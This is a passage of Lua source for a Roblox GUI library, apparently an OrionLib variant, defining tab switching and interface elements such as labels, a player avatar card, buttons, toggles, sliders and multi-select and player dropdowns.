                TabFrame.Ico.Image = GetIcon(TabConfig.Icon)
            end	

            local Container = AddThemeObject(SetChildren(SetProps(MakeElement("ScrollFrame", Color3.fromRGB(255, 255, 255), 5), {
                Size = UDim2.new(1, -150, 1, -50),
                Position = UDim2.new(0, 150, 0, 50),
                Parent = MainWindow,
                Visible = false,
                Name = "ItemContainer"
            }), {
                MakeElement("List", 0, 6),
                MakeElement("Padding", 15, 10, 10, 15)
            }), "Divider")

            AddConnection(Container.UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"), function()
                Container.CanvasSize = UDim2.new(0, 0, 0, Container.UIListLayout.AbsoluteContentSize.Y + 30)
            end)

            if FirstTab then
                FirstTab = false
                TabFrame.Ico.ImageTransparency = 0
                TabFrame.Title.TextTransparency = 0
                TabFrame.Title.Font = Enum.Font.GothamBlack
                Container.Visible = true
            end    

            AddConnection(TabFrame.MouseButton1Click, function()
                for _, Tab in next, TabHolder:GetChildren() do
                    if Tab:IsA("TextButton") then
                        Tab.Title.Font = Enum.Font.GothamSemibold
                        TweenService:Create(Tab.Ico, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0.4}):Play()
                        TweenService:Create(Tab.Title, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0.4}):Play()
                    end    
                end
                for _, ItemContainer in next, MainWindow:GetChildren() do
                    if ItemContainer.Name == "ItemContainer" then
                        ItemContainer.Visible = false
                    end    
                end  
                TweenService:Create(TabFrame.Ico, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
                TweenService:Create(TabFrame.Title, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
                TabFrame.Title.Font = Enum.Font.GothamBlack
                Container.Visible = true   
            end)

            

            local function GetElements(ItemParent)
                local ElementFunction = {}
                function ElementFunction:AddLabel(Text)
                    local LabelFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 30),
                        BackgroundTransparency = 0.7,
                        Parent = ItemParent
                    }), {
                        AddThemeObject(SetProps(MakeElement("Label", Text, 15), {
                            Size = UDim2.new(1, -12, 1, 0),
                            Position = UDim2.new(0, 12, 0, 0),
                            Font = Enum.Font.GothamBold,
                            Name = "Content"
                        }), "Text"),
                        AddThemeObject(MakeElement("Stroke"), "Stroke")
                    }), "Second")

                    local LabelFunction = {}
                    function LabelFunction:Set(ToChange)
                        LabelFrame.Content.Text = ToChange
                    end
                    return LabelFunction
                end

                function ElementFunction:AddPlayerParagraph(userId)
                    userId = userId or 0
                
                    local displayName = "Unknown"
                    local username = "Unknown"
                
                    local success, result = pcall(function()
                        return UserService:GetUserInfosByUserIdsAsync({userId})
                    end)
                
                    if success and result and result[1] then
                        displayName = result[1].DisplayName or "Unknown"
                        username = result[1].Username or "Unknown"
                    end
                
                    local ParagraphFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                    Size = UDim2.new(1, 0, 0, 70),
                    BackgroundTransparency = 0.7,
                    Parent = ItemParent
                    }), {
                    SetProps(MakeElement("Image", "", 0), {
                    Name = "Avatar",
                    Size = UDim2.new(0, 60, 0, 60),
                    Position = UDim2.new(0, 5, 0, 5),
                    BackgroundTransparency = 1,
                    Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
                    }),
                
                    AddThemeObject(SetProps(MakeElement("Label", displayName, 15), {
                    Name = "DisplayName",
                    Size = UDim2.new(1, -70, 0, 20),
                    Position = UDim2.new(0, 70, 0, 10),
                    Font = Enum.Font.GothamBold,
                    TextXAlignment = Enum.TextXAlignment.Left
                    }), "Text"),
                
                    AddThemeObject(SetProps(MakeElement("Label", username, 13), {
                    Name = "Username",
                    Size = UDim2.new(1, -70, 0, 20),
                    Position = UDim2.new(0, 70, 0, 35),
                    Font = Enum.Font.GothamSemibold,
                    TextXAlignment = Enum.TextXAlignment.Left
                    }), "TextDark"),
                
                    AddThemeObject(MakeElement("Stroke"), "Stroke")
                    }), "Second")
                
                    local PlayerParagraph = {}
                    
                    function PlayerParagraph:Set(newUserId)
                        newUserId = newUserId or 0
                    
                        local dname = "Unknown"
                        local uname = "Unknown"
                    
                        local ok, data = pcall(function()
                            return UserService:GetUserInfosByUserIdsAsync({newUserId})
                        end)
                    
                        if ok and data and data[1] then
                            dname = data[1].DisplayName or "Unknown"
                            uname = data[1].Username or "Unknown"
                        end
                    
                        ParagraphFrame.DisplayName.Text = dname
                        ParagraphFrame.DisplayName.Visible = true
                        ParagraphFrame.Username.Text = uname
                        ParagraphFrame.Username.Position = UDim2.new(0, 70, 0, 35)
                        ParagraphFrame.Avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. newUserId .. "&width=420&height=420&format=png"
                    end
                
                    return PlayerParagraph
                end

                function ElementFunction:AddParagraph(Text, Content)
                    Text = Text or "Text"
                    Content = Content or "Content"

                    local ParagraphFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 30),
                        BackgroundTransparency = 0.7,
                        Parent = ItemParent
                    }), {
                        AddThemeObject(SetProps(MakeElement("Label", Text, 15), {
                            Size = UDim2.new(1, -12, 0, 14),
                            Position = UDim2.new(0, 12, 0, 10),
                            Font = Enum.Font.GothamBold,
                            Name = "Title"
                        }), "Text"),
                        AddThemeObject(SetProps(MakeElement("Label", "", 13), {
                            Size = UDim2.new(1, -24, 0, 0),
                            Position = UDim2.new(0, 12, 0, 26),
                            Font = Enum.Font.GothamSemibold,
                            Name = "Content",
                            TextWrapped = true
                        }), "TextDark"),
                        AddThemeObject(MakeElement("Stroke"), "Stroke")
                    }), "Second")

                    AddConnection(ParagraphFrame.Content:GetPropertyChangedSignal("Text"), function()
                        ParagraphFrame.Content.Size = UDim2.new(1, -24, 0, ParagraphFrame.Content.TextBounds.Y)
                        ParagraphFrame.Size = UDim2.new(1, 0, 0, ParagraphFrame.Content.TextBounds.Y + 35)
                    end)

                    ParagraphFrame.Content.Text = Content

                    local ParagraphFunction = {}
                    function ParagraphFunction:Set(ToChange)
                        ParagraphFrame.Content.Text = ToChange
                    end
                    return ParagraphFunction
                end

                function ElementFunction:AddButton(ButtonConfig)
                    ButtonConfig = ButtonConfig or {}
                    ButtonConfig.Name = ButtonConfig.Name or "Button"
                    ButtonConfig.Callback = ButtonConfig.Callback or function() end
                    ButtonConfig.Icon = ButtonConfig.Icon or "rbxassetid://3944703587"

                    local Button = {}

                    local Click = SetProps(MakeElement("Button"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    })

                    local ButtonFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 33),
                        Parent = ItemParent
                    }), {
                        AddThemeObject(SetProps(MakeElement("Label", ButtonConfig.Name, 15), {
                            Size = UDim2.new(1, -12, 1, 0),
                            Position = UDim2.new(0, 12, 0, 0),
                            Font = Enum.Font.GothamBold,
                            Name = "Content"
                        }), "Text"),
                        AddThemeObject(SetProps(MakeElement("Image", ButtonConfig.Icon), {
                            Size = UDim2.new(0, 20, 0, 20),
                            Position = UDim2.new(1, -30, 0, 7),
                        }), "TextDark"),
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        Click
                    }), "Second")

                    AddConnection(Click.MouseEnter, function()
                        TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
                    end)

                    AddConnection(Click.MouseLeave, function()
                        TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
                    end)

                    AddConnection(Click.MouseButton1Up, function()
                        TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
                        spawn(function()
                            ButtonConfig.Callback()
                        end)
                    end)

                    AddConnection(Click.MouseButton1Down, function()
                        TweenService:Create(ButtonFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
                    end)

                    function Button:Set(ButtonText)
                        ButtonFrame.Content.Text = ButtonText
                    end	

                    return Button
                end

                function ElementFunction:AddToggle(ToggleConfig)
                    ToggleConfig = ToggleConfig or {}
                    ToggleConfig.Name = ToggleConfig.Name or "Toggle"
                    ToggleConfig.Default = ToggleConfig.Default or false
                    ToggleConfig.Callback = ToggleConfig.Callback or function() end
                    ToggleConfig.Color = ToggleConfig.Color or Color3.fromRGB(9, 99, 195)
                    ToggleConfig.Flag = ToggleConfig.Flag or nil
                    ToggleConfig.Save = ToggleConfig.Save or false

                    local Toggle = {Value = ToggleConfig.Default, Save = ToggleConfig.Save}

                    local Click = SetProps(MakeElement("Button"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    })

                    local ToggleBox = SetChildren(SetProps(MakeElement("RoundFrame", ToggleConfig.Color, 0, 4), {
                        Size = UDim2.new(0, 24, 0, 24),
                        Position = UDim2.new(1, -24, 0.5, 0),
                        AnchorPoint = Vector2.new(0.5, 0.5)
                    }), {
                        SetProps(MakeElement("Stroke"), {
                            Color = ToggleConfig.Color,
                            Name = "Stroke",
                            Transparency = 0.5
                        }),
                        SetProps(MakeElement("Image", "rbxassetid://3944680095"), {
                            Size = UDim2.new(0, 20, 0, 20),
                            AnchorPoint = Vector2.new(0.5, 0.5),
                            Position = UDim2.new(0.5, 0, 0.5, 0),
                            ImageColor3 = Color3.fromRGB(255, 255, 255),
                            Name = "Ico"
                        }),
                    })

                    local ToggleFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 38),
                        Parent = ItemParent
                    }), {
                        AddThemeObject(SetProps(MakeElement("Label", ToggleConfig.Name, 15), {
                            Size = UDim2.new(1, -12, 1, 0),
                            Position = UDim2.new(0, 12, 0, 0),
                            Font = Enum.Font.GothamBold,
                            Name = "Content"
                        }), "Text"),
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        ToggleBox,
                        Click
                    }), "Second")

                    function Toggle:Set(Value)
                        Toggle.Value = Value
                        TweenService:Create(ToggleBox, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Toggle.Value and ToggleConfig.Color or OrionLib.Themes.Default.Divider}):Play()
                        TweenService:Create(ToggleBox.Stroke, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Color = Toggle.Value and ToggleConfig.Color or OrionLib.Themes.Default.Stroke}):Play()
                        TweenService:Create(ToggleBox.Ico, TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {ImageTransparency = Toggle.Value and 0 or 1, Size = Toggle.Value and UDim2.new(0, 20, 0, 20) or UDim2.new(0, 8, 0, 8)}):Play()
                        ToggleConfig.Callback(Toggle.Value)
                    end    

                    Toggle:Set(Toggle.Value)

                    AddConnection(Click.MouseEnter, function()
                        TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
                    end)

                    AddConnection(Click.MouseLeave, function()
                        TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = OrionLib.Themes[OrionLib.SelectedTheme].Second}):Play()
                    end)

                    AddConnection(Click.Activated, function()
                        TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 3, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 3)}):Play()
                        SaveCfg(game.GameId)
                        Toggle:Set(not Toggle.Value)
                    end)

                    AddConnection(Click.MouseButton1Down, function()
                        TweenService:Create(ToggleFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {BackgroundColor3 = Color3.fromRGB(OrionLib.Themes[OrionLib.SelectedTheme].Second.R * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.G * 255 + 6, OrionLib.Themes[OrionLib.SelectedTheme].Second.B * 255 + 6)}):Play()
                    end)

                    if ToggleConfig.Flag then
                        OrionLib.Flags[ToggleConfig.Flag] = Toggle
                    end	
                    return Toggle
                end

                function ElementFunction:AddSlider(SliderConfig)
                    SliderConfig = SliderConfig or {}
                    SliderConfig.Name = SliderConfig.Name or "Slider"
                    SliderConfig.Min = SliderConfig.Min or 0
                    SliderConfig.Max = SliderConfig.Max or 100
                    SliderConfig.Increment = SliderConfig.Increment or 1
                    SliderConfig.Default = SliderConfig.Default or 50
                    SliderConfig.Callback = SliderConfig.Callback or function() end
                    SliderConfig.ValueName = SliderConfig.ValueName or ""
                    SliderConfig.Color = SliderConfig.Color or Color3.fromRGB(9, 149, 98)
                    SliderConfig.Flag = SliderConfig.Flag or nil
                    SliderConfig.Save = SliderConfig.Save or false

                    local Slider = {Value = SliderConfig.Default, Save = SliderConfig.Save}
                    local Dragging = false

                    local SliderDrag = SetChildren(SetProps(MakeElement("RoundFrame", SliderConfig.Color, 0, 5), {
                        Size = UDim2.new(0, 0, 1, 0),
                        BackgroundTransparency = 0.3,
                        ClipsDescendants = true
                    }), {
                        AddThemeObject(SetProps(MakeElement("Label", "value", 13), {
                            Size = UDim2.new(1, -12, 0, 14),
                            Position = UDim2.new(0, 12, 0, 6),
                            Font = Enum.Font.GothamBold,
                            Name = "Value",
                            TextTransparency = 0
                        }), "Text")
                    })

                    local SliderBar = SetChildren(SetProps(MakeElement("RoundFrame", SliderConfig.Color, 0, 5), {
                        Size = UDim2.new(1, -24, 0, 26),
                        Position = UDim2.new(0, 12, 0, 30),
                        BackgroundTransparency = 0.9
                    }), {
                        SetProps(MakeElement("Stroke"), {
                            Color = SliderConfig.Color
                        }),
                        AddThemeObject(SetProps(MakeElement("Label", "value", 13), {
                            Size = UDim2.new(1, -12, 0, 14),
                            Position = UDim2.new(0, 12, 0, 6),
                            Font = Enum.Font.GothamBold,
                            Name = "Value",
                            TextTransparency = 0.8
                        }), "Text"),
                        SliderDrag
                    })

                    local SliderFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 4), {
                        Size = UDim2.new(1, 0, 0, 65),
                        Parent = ItemParent
                    }), {
                        AddThemeObject(SetProps(MakeElement("Label", SliderConfig.Name, 15), {
                            Size = UDim2.new(1, -12, 0, 14),
                            Position = UDim2.new(0, 12, 0, 10),
                            Font = Enum.Font.GothamBold,
                            Name = "Content"
                        }), "Text"),
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        SliderBar
                    }), "Second")

                    local Dragging, DragInput, MousePos, FramePos = false

                    AddConnection(SliderBar.InputBegan, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                            Dragging = true
                            MousePos = Input.Position
                            FramePos = SliderBar.Position
            
                            AddConnection(Input.Changed, function()
                                if Input.UserInputState == Enum.UserInputState.End then
                                    Dragging = false
                                    FocusDrag = nil
                                end
                            end)
                        end
                    end)
                    AddConnection(SliderBar.InputChanged, function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch and not FocusDrag then
                            DragInput = Input
                            FocusDrag = DragInput
                        end
                    end)

                    AddConnection(UserInputService.InputChanged, function(Input)
                        if Input == DragInput and Input == FocusDrag and Dragging then
                            local SizeScale = math.clamp((Input.Position.X - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X, 0, 1)
                            Slider:Set(SliderConfig.Min + ((SliderConfig.Max - SliderConfig.Min) * SizeScale)) 
                            SaveCfg(game.GameId)
                        end
                    end)

                    --[[

                    SliderBar.InputBegan:Connect(function(Input)
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then 
                            Dragging = true 
                        end 
                    end)
                    SliderBar.InputEnded:Connect(function(Input) 
                        if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then 
                            Dragging = false 
                        end 
                    end)

                    SliderBar.MouseButton1Down:Connect(function()
                        local Location;
                        local loop; loop = RunService.Stepped:Connect(function()
                            if Dragging then
                                Location = UserInputService:GetMouseLocation().X
                                local SizeScale = math.clamp((Location - SliderBar.AbsolutePosition.X) / SliderBar.AbsoluteSize.X, 0, 1)
                                Slider:Set(SliderConfig.Min + ((SliderConfig.Max - SliderConfig.Min) * SizeScale)) 
                                SaveCfg(game.GameId)
                            else
                                loop:Disconnect()
                            end
                        end)
                    end)

                    
                    ]]--
                    
                    function Slider:Set(Value)
                        self.Value = math.clamp(Round(Value, SliderConfig.Increment), SliderConfig.Min, SliderConfig.Max)
                        TweenService:Create(SliderDrag,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = UDim2.fromScale((self.Value - SliderConfig.Min) / (SliderConfig.Max - SliderConfig.Min), 1)}):Play()
                        SliderBar.Value.Text = tostring(self.Value) .. " " .. SliderConfig.ValueName
                        SliderDrag.Value.Text = tostring(self.Value) .. " " .. SliderConfig.ValueName
                        SliderConfig.Callback(self.Value)
                    end      

                    Slider:Set(Slider.Value)
                    if SliderConfig.Flag then				
                        OrionLib.Flags[SliderConfig.Flag] = Slider
                    end
                    return Slider
                end

                function ElementFunction:AddMultipleDropdown(DropdownConfig)
                    DropdownConfig = DropdownConfig or {}
                    DropdownConfig.Name = DropdownConfig.Name or "Dropdown"
                    DropdownConfig.Options = DropdownConfig.Options or {}
                    DropdownConfig.Default = DropdownConfig.Default or ""
                    DropdownConfig.Callback = DropdownConfig.Callback or function() end
                    DropdownConfig.Flag = DropdownConfig.Flag or nil
                    DropdownConfig.Save = DropdownConfig.Save or false

                    local Dropdown = {Value = DropdownConfig.Default, Options = DropdownConfig.Options, Buttons = {}, Toggled = false, Type = "Dropdown", Save = DropdownConfig.Save}
                    local MaxElements = 5

                    if not table.find(Dropdown.Options, Dropdown.Value) then
                        Dropdown.Value = "..."
                    end

                    local SelectedValues = {}

                    local DropdownList = MakeElement("List")

                    local DropdownContainer = AddThemeObject(SetProps(SetChildren(MakeElement("ScrollFrame", Color3.fromRGB(40, 40, 40), 4), {
                        DropdownList
                    }), {
                        Parent = ItemParent,
                        Position = UDim2.new(0, 0, 0, 38),
                        Size = UDim2.new(1, 0, 1, -38),
                        ClipsDescendants = true
                    }), "Divider")

                    local Click = SetProps(MakeElement("Button"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    })

                    local DropdownFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 38),
                        Parent = ItemParent,
                        ClipsDescendants = true
                    }), {
                        DropdownContainer,
                        SetProps(SetChildren(MakeElement("TFrame"), {
                            AddThemeObject(SetProps(MakeElement("Label", DropdownConfig.Name, 15), {
                                Size = UDim2.new(1, -12, 1, 0),
                                Position = UDim2.new(0, 12, 0, 0),
                                Font = Enum.Font.GothamBold,
                                Name = "Content"
                            }), "Text"),
                            AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072706796"), {
                                Size = UDim2.new(0, 20, 0, 20),
                                AnchorPoint = Vector2.new(0, 0.5),
                                Position = UDim2.new(1, -30, 0.5, 0),
                                ImageColor3 = Color3.fromRGB(240, 240, 240),
                                Name = "Ico"
                            }), "TextDark"),
                            AddThemeObject(SetProps(MakeElement("Label", "Selected", 13), {
                                Size = UDim2.new(1, -40, 1, 0),
                                Font = Enum.Font.Gotham,
                                Name = "Selected",
                                TextXAlignment = Enum.TextXAlignment.Right
                            }), "TextDark"),
                            AddThemeObject(SetProps(MakeElement("Frame"), {
                                Size = UDim2.new(1, 0, 0, 1),
                                Position = UDim2.new(0, 0, 1, -1),
                                Name = "Line",
                                Visible = false
                            }), "Stroke"), 
                            Click
                        }), {
                            Size = UDim2.new(1, 0, 0, 38),
                            ClipsDescendants = true,
                            Name = "F"
                        }),
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        MakeElement("Corner")
                    }), "Second")

                    AddConnection(DropdownList:GetPropertyChangedSignal("AbsoluteContentSize"), function()
                        DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)
                    end)  

                    local function AddOptions(Options)
                        for _, Option in pairs(Options) do
                            local OptionBtn = AddThemeObject(SetProps(SetChildren(MakeElement("Button", Color3.fromRGB(40, 40, 40)), {
                                MakeElement("Corner", 0, 6),
                                AddThemeObject(SetProps(MakeElement("Label", Option, 13, 0.4), {
                                    Position = UDim2.new(0, 8, 0, 0),
                                    Size = UDim2.new(1, -8, 1, 0),
                                    Name = "Title"
                                }), "Text")
                            }), {
                                Parent = DropdownContainer,
                                Size = UDim2.new(1, 0, 0, 28),
                                BackgroundTransparency = 1,
                                ClipsDescendants = true
                            }), "Divider")

                            AddConnection(OptionBtn.MouseButton1Click, function()
                                Dropdown:Set(Option)
                                SaveCfg(game.GameId)
                            end)

                            Dropdown.Buttons[Option] = OptionBtn
                        end
                    end	

                    function Dropdown:Refresh(Options, Delete)
                        if Delete then
                            for _,v in pairs(Dropdown.Buttons) do
                                v:Destroy()
                            end    
                            table.clear(Dropdown.Options)
                            table.clear(Dropdown.Buttons)
                        end
                        Dropdown.Options = Options
                        AddOptions(Dropdown.Options)
                    end  

                    function Dropdown:Set(Value)
                        local n = table.find(SelectedValues, Value)
                        local text = ""

                        if not n then
                            print("Adicionado")
                            table.insert(SelectedValues, Value)
                            DropdownFrame.F.Selected.Text = Dropdown.Value
                            TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 0}):Play()
                            TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0}):Play()
                        else
                            print("Removido")
                            table.remove(SelectedValues, n)
                            TweenService:Create(Dropdown.Buttons[Value],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundTransparency = 1}):Play()
                            TweenService:Create(Dropdown.Buttons[Value].Title,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{TextTransparency = 0.4}):Play()
                        end

                        for i, v in pairs(SelectedValues) do
                            if #SelectedValues == i then
                                text = text .. v
                            else
                                text = text .. v .. ", "
                            end
                        end

                        Dropdown.Value = Value
                        DropdownFrame.F.Selected.Text = text

                        return DropdownConfig.Callback(SelectedValues)
                    end

                    AddConnection(Click.MouseButton1Click, function()
                        Dropdown.Toggled = not Dropdown.Toggled
                        DropdownFrame.F.Line.Visible = Dropdown.Toggled
                        TweenService:Create(DropdownFrame.F.Ico,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Rotation = Dropdown.Toggled and 180 or 0}):Play()
                        if #Dropdown.Options > MaxElements then
                            TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (MaxElements * 28)) or UDim2.new(1, 0, 0, 38)}):Play()
                        else
                            TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{Size = Dropdown.Toggled and UDim2.new(1, 0, 0, DropdownList.AbsoluteContentSize.Y + 38) or UDim2.new(1, 0, 0, 38)}):Play()
                        end
                    end)

                    Dropdown:Refresh(Dropdown.Options, false)
                    Dropdown:Set(Dropdown.Value)
                    if DropdownConfig.Flag then				
                        OrionLib.Flags[DropdownConfig.Flag] = Dropdown
                    end
                    
                    return Dropdown
                end

                function ElementFunction:AddPlayersDropdown(DropdownConfig)
                    DropdownConfig = DropdownConfig or {}
                    DropdownConfig.Name = DropdownConfig.Name or "Dropdown"
                    DropdownConfig.Options = DropdownConfig.Options or {}
                    DropdownConfig.RemoveDp = DropdownConfig.RemoveDP or false
                    DropdownConfig.Default = DropdownConfig.Default or ""
                    DropdownConfig.Callback = DropdownConfig.Callback or function() end
                    DropdownConfig.Flag = DropdownConfig.Flag or nil
                    DropdownConfig.MultipleSelection = DropdownConfig.MultipleSelection or false
                    DropdownConfig.Save = DropdownConfig.Save or false

                    local Dropdown = {Value = DropdownConfig.Default, Options = DropdownConfig.Options, Buttons = {}, Toggled = false, Type = "Dropdown", Save = DropdownConfig.Save, MultipleSelection = DropdownConfig.MultipleSelection}
                    local MaxElements = 3

                    if not table.find(Dropdown.Options, Dropdown.Value) then
                        Dropdown.Value = "..."
                    end

                    local SelectedValues = {}
                    local Options = 0

                    local DropdownList = MakeElement("List")

                    local DropdownContainer = AddThemeObject(SetProps(SetChildren(MakeElement("ScrollFrame", Color3.fromRGB(40, 40, 40), 4), {
                        DropdownList
                    }), {
                        Parent = ItemParent,
                        Position = UDim2.new(0, 0, 0, 38),
                        Size = UDim2.new(1, 0, 1, -38),
                        ClipsDescendants = true
                    }), "Divider")

                    local Click = SetProps(MakeElement("Button"), {
                        Size = UDim2.new(1, 0, 1, 0)
                    })

                    local DropdownFrame = AddThemeObject(SetChildren(SetProps(MakeElement("RoundFrame", Color3.fromRGB(255, 255, 255), 0, 5), {
                        Size = UDim2.new(1, 0, 0, 38),
                        Parent = ItemParent,
                        ClipsDescendants = true
                    }), {
                        DropdownContainer,
                        SetProps(SetChildren(MakeElement("TFrame"), {
                            AddThemeObject(SetProps(MakeElement("Label", DropdownConfig.Name, 15), {
                                Size = UDim2.new(1, -12, 1, 0),
                                Position = UDim2.new(0, 12, 0, 0),
                                Font = Enum.Font.GothamBold,
                                Name = "Content"
                            }), "Text"),
                            AddThemeObject(SetProps(MakeElement("Image", "rbxassetid://7072706796"), {
                                Size = UDim2.new(0, 20, 0, 20),
                                AnchorPoint = Vector2.new(0, 0.5),
                                Position = UDim2.new(1, -30, 0.5, 0),
                                ImageColor3 = Color3.fromRGB(240, 240, 240),
                                Name = "Ico"
                            }), "TextDark"),
                            AddThemeObject(SetProps(MakeElement("Label", "Selected", 13), {
                                Size = UDim2.new(1, -40, 1, 0),
                                Font = Enum.Font.Gotham,
                                Name = "Selected",
                                TextXAlignment = Enum.TextXAlignment.Right
                            }), "TextDark"),
                            AddThemeObject(SetProps(MakeElement("Frame"), {
                                Size = UDim2.new(1, 0, 0, 1),
                                Position = UDim2.new(0, 0, 1, -1),
                                Name = "Line",
                                Visible = false
                            }), "Stroke"), 
                            Click
                        }), {
                            Size = UDim2.new(1, 0, 0, 38),
                            ClipsDescendants = true,
                            Name = "F"
                        }),
                        AddThemeObject(MakeElement("Stroke"), "Stroke"),
                        MakeElement("Corner")
                    }), "Second")

                    AddConnection(DropdownList:GetPropertyChangedSignal("AbsoluteContentSize"), function()
                        DropdownContainer.CanvasSize = UDim2.new(0, 0, 0, DropdownList.AbsoluteContentSize.Y)

                        if Options <= MaxElements then
                            TweenService:Create(DropdownFrame,TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = Dropdown.Toggled and UDim2.new(1, 0, 0, 38 + (Options * 45)) or UDim2.new(1, 0, 0, 38)}):Play()
                        end
                    end)

                    local function RemoveOption(Option)
                        if Dropdown.Buttons[Option] then
                            local n = table.find(SelectedValues, Option)

                            if n then
                                Dropdown.Buttons[Option].State.Visible = true
                                TweenService:Create(Dropdown.Buttons[Option],TweenInfo.new(.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),{BackgroundColor3 = Color3.fromRGB(200, 80, 80)}):Play()
                            else
                                Dropdown.Buttons[Option]:Destroy()
                                Dropdown.Buttons[Option] = nil
                                Options = Options - 1
                            end
                        end
                    end

                    local function AddOption(Option)
                        local Player_Name = Option.Name
                        local Player_Display = Option.DisplayName
                        local UId = Option.UserId

                        local Option = Player_Name

                        if not Dropdown.Buttons[Option] then
